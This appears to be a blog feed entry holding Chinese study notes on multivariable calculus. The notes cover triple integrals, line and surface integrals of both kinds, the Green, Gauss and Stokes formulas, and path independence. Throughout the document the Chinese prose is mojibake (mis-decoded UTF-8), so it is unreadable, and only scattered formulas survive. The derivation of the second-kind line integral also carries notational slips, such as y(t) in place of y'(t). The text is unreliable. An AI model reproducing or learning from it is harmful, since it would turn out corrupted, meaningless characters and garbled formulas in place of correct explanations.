<strong>è®¡ç®—æ–¹æ³•</strong>: 1ã€ç›´æ¥è®¡ç®—æœ‰ä¸¤ç§ (1)<strong>å…ˆä¸€åäºŒ</strong>.å…ˆæŠŠå‡ ä½•ä½“æŠ•å½±åˆ°æŸä¸ªå¹³é¢ç„¶åå˜æˆäºŒé‡ç§¯åˆ†è®¡ç®—ã€‚æ¯”å¦‚å…ˆå¯¹zç§¯åˆ†ï¼Œå°±æ˜¯å…ˆæŠŠå‡ ä½•ä½“å¾€xoyå¹³é¢æŠ•å½±ï¼Œç„¶åå¯¹å¹³é¢å†…çš„åŒºåŸŸè¿›è¡ŒäºŒé‡ç§¯åˆ†ã€‚ (2)<strong>å…ˆäºŒåä¸€</strong>.è¿™ä¸ªå¾ˆå¥½ç”¨ï¼Œè¯´åˆ°åº•å…¶å®æ˜¯å®šç§¯åˆ†ï¼Œå½“æ²¿æŸä¸ªåæ ‡è½´(æ¯”å¦‚z)ï¼Œè¯¥å‡ ä½•ä½“çš„æ¯ä¸ªæˆªé¢(ç”¨z=æŸä¸ªå€¼æ¥æˆª)éƒ½å¯ä»¥ç”¨è¯¥è½´æ‰€ä»£è¡¨çš„å˜é‡(z)è¡¨ç¤ºçš„æ—¶å€™ï¼Œå°±ç›´æ¥æŠŠæˆªé¢ç”¨å˜é‡çš„æ–¹ç¨‹è¡¨ç¤º(æˆªé¢ç”¨zè¡¨ç¤º),ç„¶åä¹˜å¾®å…ƒdzï¼Œç§¯åˆ†å°±å¾—åˆ°äº†ç»“æœã€‚ 2ã€<strong>æŸ±åæ ‡</strong>.è¿™ä¸ªå°±ç›´æ¥æŠŠxï¼Œyå½“rå’ŒÎ¸æ¥ç”¨å°±å¯ä»¥äº†ï¼Œzè¿˜æ˜¯zï¼Œä¸ä½œè¿‡å¤šè¯´æ˜ 3ã€<strong>çƒåæ ‡</strong>.è¿™ä¸ªæ˜¯ç”±Î¸ï¼ŒÏ†ï¼Œrç»„æˆçš„ï¼Œä¸€èˆ¬æƒ…å†µæ˜¯å…ˆå¯¹rï¼Œå†å¯¹Ï†ï¼Œæœ€åå¯¹Î¸ç§¯åˆ†ã€‚ä¸å¤šä»‹ç»ã€‚ è¾ƒå†·é—¨:ä¸‰å…ƒçš„æ¢å…ƒï¼ŒåŒäºŒå…ƒã€‚ <strong>æŠ€å·§</strong>: 1ã€<strong>è½®æ¢å¯¹ç§°æ€§</strong>ï¼<strong>è½®æ¢å¯¹ç§°æ€§</strong>ï¼<strong>è½®æ¢å¯¹ç§°æ€§</strong>ï¼é‡è¦çš„äº‹è¯´ä¸‰éï¼ï¼ï¼è¿™ä¸ªå¤ªé‡è¦äº†ï¼Œç”¨å¾—å¥½çš„è¯ç®€åŒ–çš„ä¸æ­¢ä¸€ç‚¹.... 2ã€<strong>å¥‡å¶æ€§</strong> 3ã€<strong>å½¢å¿ƒçš„æ„ä¹‰</strong>.è¿™ä¸ªå¯èƒ½æœ‰ç‚¹å†·é—¨è¯´å®è¯å¾ˆå¥½ç”¨ï¼Œç®€åŒ–è¿ç®—å¾ˆæœ‰ç”¨ã€‚ç”¨äºè®¡ç®—âˆ«âˆ«âˆ«zdvä¹‹ç±»çš„è¢«ç§¯å‡½æ•°åªå«ä¸€ä¸ªå‡½æ•°å…ƒçš„ã€‚ Â </p><h4 id="ç¬¬ä¸€ç±»æ›²çº¿ç§¯åˆ†">ç¬¬ä¸€ç±»æ›²çº¿ç§¯åˆ†</h4><p>è¯´å®è¯ï¼Œåˆ°äº†ä»€ä¹ˆæ›²çº¿ç§¯åˆ†å•Šï¼Œæ›²é¢ç§¯åˆ†å•Šçš„æˆ‘å°±éƒ½å¿˜äº†...... <strong>è€ƒç‚¹</strong>:ä¸å¤ªæ¸…é™¤ï¼Œä½†æ˜¯ä¼¼ä¹ä¸éš¾.....æˆ‘ç¢°åˆ°çš„å‡ ä¹éƒ½æ˜¯è®¡ç®— <strong>å‡ ä½•æ„ä¹‰</strong>:å°†è¢«ç§¯å‡½æ•°çœ‹ä½œæ›²çº¿çš„å¯†åº¦å‡½æ•°ï¼Œé‚£ä¹ˆç¬¬ä¸€ç±»æ›²çº¿ç§¯åˆ†å°±ä»£è¡¨æŸä¸€æ¡æ›²çº¿Â (å³Lä¸Š)çš„è´¨é‡ã€‚ <strong>è®¡ç®—æ³•</strong>:ç›´æ¥å¸¦å…¥å°±å¥½äº†å˜›ï¼Œè®°å¾—è¦ä¹˜ä¸Šä¸€ä¸ªå¼§å¾®åˆ†âˆšx'(t)Â Â²+y'(t)Â²ã€‚å¦‚æœå°†xçœ‹æˆä¸­é—´å˜é‡çš„è¯é‚£y'å°±æ˜¯xçš„å¯¼æ•°ï¼Œxçš„å¯¼ä¸º1 <strong>æŠ€å·§</strong>:æ²¡æœ‰æŠ€å·§å°±æ˜¯ç®—<strong>åŒºåˆ«ä¸ç¬¬äºŒç±»æ›²çº¿ç§¯åˆ†</strong>(ç¬¬ä¸€ç±»æ˜¯dLï¼Œç¬¬äºŒç±»æ˜¯dxï¼Œdy)</p><h4 id="ç¬¬ä¸€ç±»æ›²é¢ç§¯åˆ†">ç¬¬ä¸€ç±»æ›²é¢ç§¯åˆ†</h4><p>åˆä¸€ä¸ªè’™è”½çš„æ¦‚å¿µ <strong>è€ƒç‚¹</strong>:ç®—ï¼ <strong>å‡ ä½•æ„ä¹‰</strong>:å°†è¢«ç§¯å‡½æ•°çœ‹ä½œæ›²é¢çš„å¯†åº¦å‡½æ•°ï¼Œé‚£ä¹ˆç¬¬ä¸€ç±»æ›²é¢ç§¯åˆ†å°±ä»£è¡¨æŸä¸ªæ›²é¢(S)çš„è´¨é‡ã€‚ <strong>è®¡ç®—æ³•</strong>:å…¶å®è¿˜æ˜¯æŠ•å½±ï¼Œæ¯”å¦‚å¾€xoyæŠ•å½±ï¼Œåˆ™é¢ç§¯å¾®å…ƒå˜ä¸ºâˆš1+(âˆ‚z/âˆ‚x)Â²+(âˆ‚z/âˆ‚y)Â²dxdyï¼Œæ³¨æ„å˜å®Œåzå¿…é¡»ç”¨xï¼Œyæ¥ä»£æ›¿ï¼ <strong>æŠ€å·§</strong>:è¿™ä¸ªçœŸçš„å°±æ˜¯ç®—äº†.....å½“ç„¶å˜æˆäºŒé‡ç§¯åˆ†åè¿˜æ˜¯å¯ä»¥ç”¨å‰é¢çš„äºŒé‡ç§¯åˆ†çš„æŠ€å·§çš„ Â </p><h4 id="ç¬¬äºŒç±»æ›²çº¿ç§¯åˆ†">ç¬¬äºŒç±»æ›²çº¿ç§¯åˆ†</h4><p>è¿™ä¸ªä¸œè¥¿å§ï¼Œæˆ‘çœ‹äº†ä¸ªå‡ éæ„Ÿè§‰å·®ä¸å¤šäº†..... ä¸‹é¢ä»ä¹¦ä¸Šçš„å†…å®¹æ¥è®°å½•ä¸‹ é¦–å…ˆæœ¬æ¥ç§¯åˆ†æ˜¯âˆ«<strong>f</strong>d<strong>s</strong>,å…¶ä¸­få’Œsæ˜¯å‘é‡ï¼Œd<strong>s</strong>=<strong>Ï„</strong>ds,å³æ–¹å‘å¼§çº¿çš„å¾®å…ƒç­‰äºå¼§å¾®åˆ†ä¹˜å•ä½æ–¹å‘å‘é‡ï¼Œç„¶åå•ä½æ–¹å‘å‘é‡ç­‰äº[x'(t)<strong>i</strong>+y(t)<strong>j</strong>+z(t)<strong>k</strong>]/âˆšx'(t)Â Â²+y'(t)Â²+z'(t)Â²,è€Œdsè¿˜æ˜¯å’Œå‰é¢çš„ç¬¬ä¸€ç±»æ›²çº¿ç§¯åˆ†ä¸€æ ·ä¸ºâˆšx'(t)Â Â²+y'(t)Â²+z'(t)Â²ã€‚é‚£ä¹ˆä¹˜ç§¯å°±ç­‰äºx'(t)<strong>i</strong>+y(t)<strong>j</strong>+z(t)<strong>kï¼Œ</strong>ä¹Ÿå°±æ˜¯dx<strong>i</strong>+dy<strong>j</strong>+dz<strong>k</strong>=(dx,dy,dz),è€Œ<strong>f</strong>åˆå¯ä»¥åˆ†è§£ä¸ºiï¼Œjï¼Œkä¸‰ä¸ªæ–¹å‘ï¼Œè®¡å„ä¸ªæ–¹å‘çš„å€¼ä¸ºPï¼ŒQï¼ŒRã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¾—åˆ°äº†ç»“æœâˆ«<strong>f</strong>d<strong>s</strong>=âˆ«Pdx+Qdy+rdz åˆ°è¿™é‡Œç¬¬äºŒç±»æ›²çº¿ç§¯åˆ†çš„è®¡ç®—å°±è¢«æˆ‘ä»¬æ¨äº†ä¸€éäº†ã€‚ <strong>è€ƒç‚¹</strong>:å°±æ˜¯è®¡ç®—äº†.... <strong>å‡ ä½•æ„ä¹‰</strong>:è®¾fä¸ºä¸€ä¸ªå˜åŠ›ï¼Œsä¸ºç‰©ä½“è¿åŠ¨çš„è½¨è¿¹(å…·æœ‰æ–¹å‘)ï¼Œé‚£ä¹ˆç§¯åˆ†çš„å€¼å°±æ˜¯fæ‰€åšçš„åŠŸã€‚ <strong>è®¡ç®—æ–¹æ³•</strong>:å°†xï¼Œyï¼Œzæ¢æˆtçš„ä»£æ•°å¼ï¼Œç„¶åä»£è¿›å»ï¼Œç§¯åˆ†ä¸Šä¸‹é™å–tçš„èµ·å§‹å€¼ï¼Œç„¶åç®—å®šç§¯åˆ†å°±okäº†ã€‚ <strong>æŠ€å·§</strong>:æ²¡æœ‰æŠ€å·§.....</p><h4 id="ç¬¬äºŒç±»æ›²é¢ç§¯åˆ†">ç¬¬äºŒç±»æ›²é¢ç§¯åˆ†</h4><p>è¿™ä¸ªç†è§£èµ·æ¥å°±éš¾å¾—å¤šäº†ï¼Œâˆ«âˆ«<strong>Fâ€¢n0</strong>ds<strong>,</strong>ç„¶åè¿™é‡Œ<strong>n0</strong>åˆå¯ä»¥å†™ç”±<strong>i,j,k</strong>è¡¨ç¤ºï¼Œé‚£ä¹ˆå…ˆæŠŠ<strong>F</strong>åˆ†è§£ä¸ºå„ä¸ªæ–¹å‘ï¼Œå³<strong>F</strong>=P<strong>i</strong>+Q<strong>j</strong>+R<strong>k</strong> åˆ™âˆ«âˆ«<strong>Fâ€¢n0</strong>dså¯ä»¥è¡¨ç¤ºä¸ºâˆ«âˆ«P<strong>iâ€¢n0</strong>ds+âˆ«âˆ«Q<strong>jâ€¢n0</strong>ds+âˆ«âˆ«R<strong>kâ€¢n0</strong>ds,è€Œ<strong>n0</strong>=(-zx<strong>i</strong>-zy<strong>j</strong>+<strong>k</strong>)/âˆš1+zÂ²x+zÂ²yä¹˜ä¸Šdsååˆ†æ¯çº¦æ‰ï¼Œå‰©ä¸‹åˆ†å­ï¼Œä¹Ÿå°±æ˜¯æ³•å‘é‡çš„è¡¨è¾¾å¼.è¿™å°±å¾—åˆ°ä¸€ç§ç®—ç¬¬äºŒç±»æ›²é¢ç§¯åˆ†çš„æ–¹æ³•<strong>åˆä¸€æŠ•å½±æ³•</strong>ï¼Œä¹Ÿå°±æ˜¯âˆ«âˆ«(P,Q,R)<strong>â€¢</strong>(-zx,-zy,1)dxdy Â <strong>(æ³¨:å¹³é¢æŒ‡å‘å‰é¢ï¼Œä¸Šé¢ï¼Œå³é¢æ—¶å¸¸æ•°å–1ï¼Œå¦åˆ™å–-1(å³æ³•å‘é‡å–å))Â </strong> å¦ä¸€ç§æ–¹æ³•æ˜¯å°†dså’Œ<strong>n0</strong>åˆå¹¶äº†ï¼Œå› ä¸º<strong>n0</strong>å¯ä»¥å†™ä¸º(cosÎ±,cosÎ²,cosÎ³),åˆ†åˆ«ä¹˜ä¸Šdsåå°±æ˜¯(dydz,dzdx,dxdy),ç„¶ååŒæ„å–ä¸ªæ–¹å‘ï¼Œæ¢ä¸ªå˜é‡å°±okï¼Œè¿™ä¸ªå°±æ˜¯<strong>åˆ†é¢æŠ•å½±æ³•</strong>ã€‚ <strong>è€ƒç‚¹</strong>:å¤šç§è®¡ç®—æ–¹æ³•å‘— <strong>å‡ ä½•æ„ä¹‰</strong>:è®¾æµä½“é€Ÿåº¦ä¸º<strong>v</strong>ï¼Œç©¿è¿‡çš„å¹³é¢ä¸ºSï¼Œé‚£ä¹ˆæµé‡å°±ä¸ºè¿™ä¸ªç§¯åˆ†çš„å€¼ã€‚ <strong>è®¡ç®—æ–¹æ³•</strong>: <strong>åˆä¸€æŠ•å½±æ³•:</strong>âˆ«âˆ«<strong>Fâ€¢n0</strong>ds=âˆ«âˆ«(P,Q,R)<strong>â€¢</strong>(-zx,-zy,1)dxdy Â <strong>(æ³¨:å¹³é¢æŒ‡å‘å‰é¢ï¼Œä¸Šé¢ï¼Œå³é¢æ—¶å¸¸æ•°å–1ï¼Œå¦åˆ™å–-1(å³æ³•å‘é‡å–å))Â </strong> <strong>åˆ†é¢æŠ•å½±æ³•:</strong>âˆ«âˆ«<strong>Fâ€¢n0</strong>ds=âˆ«âˆ«P(x(y,z),y,z)dydz+âˆ«âˆ«Q(x,y(x,z),z)dzdx+.... <strong>æŠ€å·§:</strong>dxdyï¼Œdydzï¼Œdxdzéƒ½æœ‰çš„ç”¨åˆä¸€ï¼Œåªæœ‰ä¸€ä¸ªçš„ç”¨åˆ†é¢.</p><h4 id="æ ¼æ—å…¬å¼">æ ¼æ—å…¬å¼</h4><p>ç”¨äºè®¡ç®—æŸäº›ç‰¹æ®Šå›¾å½¢çš„é¢ç§¯ï¼Œæˆ–è€…æ˜¯è®¡ç®—å½¢å¼ä¸Šéº»çƒ¦çš„ç¬¬äºŒç±»æ›²çº¿ç§¯åˆ†ã€‚ <strong>è€ƒç‚¹</strong>:è¡¥æˆå°é—­å›¾å½¢ï¼Œå¤è¿é€šåŒºåŸŸåå¯¼ç›¸ç­‰æ¥æ”¹å˜å›¾å½¢ï¼Œç­‰ç­‰ä¸€äº›æ“ä½œ..... <strong>æ³¨æ„</strong>:æŸäº›åœ°æ–¹æœ‰çš„ç‚¹åå¯¼æ˜¯ä¸å­˜åœ¨çš„ï¼è¿™æ—¶å€™å›¾å½¢æ˜¯å¤è¿é€šåŒºåŸŸï¼ï¼ï¼ï¼(æ­£è´Ÿè¿˜æ˜¯å¤–éƒ¨é€†æ—¶é’ˆå†…éƒ¨é¡ºæ—¶é’ˆ) Â </p><h4 id="é«˜æ–¯å…¬å¼">é«˜æ–¯å…¬å¼</h4><p>ç”¨äºè®¡ç®—å¤æ‚çš„ç¬¬äºŒç±»æ›²é¢ç§¯åˆ†ï¼Œå°†è¢«ç§¯å‡½æ•°è½¬åŒ–ä¸ºç®€å•çš„ç®—å¼ï¼Œæˆ–è€…è½¬åŒ–ä¸ºæ˜“äºä½¿ç”¨æŸ±åæ ‡çƒåæ ‡è®¡ç®—çš„ç®—å¼ã€‚ <strong>è€ƒç‚¹:</strong>ä¸€å®šè¦æ˜¯<strong>å°é—­æ›²é¢</strong>ï¼Œä¸€å®šè¦æ³¨æ„ï¼ï¼ï¼ä¸æ˜¯å°é—­æ›²é¢å¯ä»¥è€ƒè™‘è¡¥æˆå°é—­æ›²é¢ã€‚é¡ºä¾¿æé†’ï¼Œè½¬åŒ–ä¸ºä¸‰é‡ç§¯åˆ†ä¹‹åä¸è¦æ‹¿æ›²é¢ç§¯åˆ†çš„ç®—å¼ä»£æ¢è¢«ç§¯å‡½æ•°ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªæ–¹ç¨‹æ˜¯å®Œå…¨ä¸åŒçš„ï¼Œä¸€ä¸ªè¡¨ç¤ºæ›²é¢ï¼Œä¸€ä¸ªè¡¨ç¤ºç©ºé—´å‡ ä½•ä½“ï¼Œæ‰€ä»¥ä»£æ¢ä¸€èˆ¬ä¼šå‡ºé”™ã€‚(å¤§æ¦‚åªæœ‰æˆ‘åšè¿‡è¿™ç§è ¢äº‹å§...... <strong>æ³¨æ„</strong>:åŒæ ·æ³¨æ„åå¯¼æ•°ä¸å­˜åœ¨çš„åŒºåŸŸã€‚å…¶æ¬¡ï¼Œæ³¨æ„ä¸€å®šè¦å°é—­æ›²é¢ã€‚æœ€åï¼Œè®¡ç®—ã€‚<strong>å·®ç‚¹å¿˜äº†</strong>ï¼Œ<strong>å¤–éƒ¨ä¸ºæ­£ï¼Œå†…éƒ¨ä¸ºè´Ÿã€‚</strong> Â </p><h4 id="æ–¯æ‰˜å…‹æ–¯å…¬å¼">æ–¯æ‰˜å…‹æ–¯å…¬å¼</h4><p>å…¶å®å°±æ˜¯ä¸‰ç»´åæ ‡ç³»ä¸‹çš„æ ¼æ—å…¬å¼ï¼Œç”¨äºæŠŠç¬¬äºŒç±»æ›²çº¿ç§¯åˆ†è½¬åŒ–ä¸ºç¬¬äºŒç±»æ›²é¢ç§¯åˆ†ã€‚ <strong>è€ƒç‚¹:</strong>è®°ä¸€ä¸‹å…¬å¼ï¼Œç„¶åä½¿ç”¨æ–¹æ³•åŒæ ¼æ—å…¬å¼ï¼Œçœ‹è§ä¸‰ç»´åæ ‡ç³»ä¸‹ç¬¬äºŒç±»æ›²çº¿ç§¯åˆ†ï¼Œæ‹¿æ–¯æ‰˜å…‹æ–¯å…¬å¼å»è¯•è¯•å°±çŸ¥é“è¡Œä¸è¡Œäº†ã€‚ Â </p><h4 id="ç§¯åˆ†ä¸è·¯å¾„æ— å…³">ç§¯åˆ†ä¸è·¯å¾„æ— å…³</h4><p>éšæ„çš„æä¸€ä¸‹äº†ã€‚ å‡ ä¸ªç­‰ä»·æ¡ä»¶ã€‚ å‰æï¼šDä¸ºå¹³é¢å•è¿é€šåŒºåŸŸï¼ŒPï¼ŒQæœ‰ä¸€é˜¶è¿ç»­åå¯¼ã€‚ 1ã€Då†…ä»»æ„ä¸€æ®µå…‰æ»‘é—­æ›²çº¿Læœ‰âˆ«LP(x,y)dx+Q(x,y)dy=0ï¼Œå³ä»»æ„ä¸€æ®µé—­æ›²çº¿çš„æ›²çº¿ç§¯åˆ†ä¸º0 2ã€âˆ«LP(x,y)dx+Q(x,y)dyçš„å€¼ä¸è·¯å¾„æ— å…³ã€‚è¿™ä¸ªå¾ˆé‡è¦ï¼Œæœ‰è¿™ä¸ªæ¡ä»¶å°±å¯ä»¥æŠŠå¥‡å¥‡æ€ªæ€ªçš„ç§¯åˆ†å¾€å¹³è¡Œåæ ‡è½´çš„æ–¹å‘è½¬åŒ–äº†ã€‚ 3ã€è¢«ç§¯è¡¨è¾¾å¼âˆ«LP(x,y)dx+Q(x,y)dyåœ¨Då†…æ˜¯æŸä¸ªäºŒå…ƒå‡½æ•°u(x,y)çš„å…¨å¾®åˆ†ã€‚ å³du(x,y)=P(x,y)dx+Q(x,y)dy Â  Â  Â  Â  Â è¿™ä¸ªä¸€èˆ¬ç”¨æ¥è§£å…¨å¾®åˆ†æ–¹ç¨‹ï¼Œå…ˆéªŒè¯âˆ‚Q/âˆ‚x=âˆ‚P/âˆ‚yç„¶åå–ç§¯åˆ†âˆ«(0,0)(x,y)P(x,y)dx+Q(x,y)dy,ç„¶åå¾€xï¼Œyè½´è½¬åŒ–å³å¯è§£é™¤å…¨å¾®åˆ†ã€‚ 4ã€åœ¨Då†…æ¯ä¸€ç‚¹éƒ½æ»¡è¶³âˆ‚Q/âˆ‚x=âˆ‚P/âˆ‚yã€‚è¿™ä¸ªä¸€èˆ¬æ˜¯ä½œä¸ºèµ·å§‹æ¡ä»¶è®©ä½ è½¬åŒ–å‡ºæ–°æ¡ä»¶çš„ã€‚ å¥½äº†å°±è¿™ä¹ˆå¤šäº†ã€‚å¤§éƒ¨åˆ†çš„ç†è§£è¿˜æ˜¯è‡ªå·±ç»ƒä¹ åŠ æ€è€ƒï¼Œè¿™é‡Œçš„æ€»ç»“åªæ˜¯åœ¨å­¦ä¹ å®Œåç”¨äºåæ€ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å¾®ç§¯åˆ†å¤§ç‰©ç­‰ </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
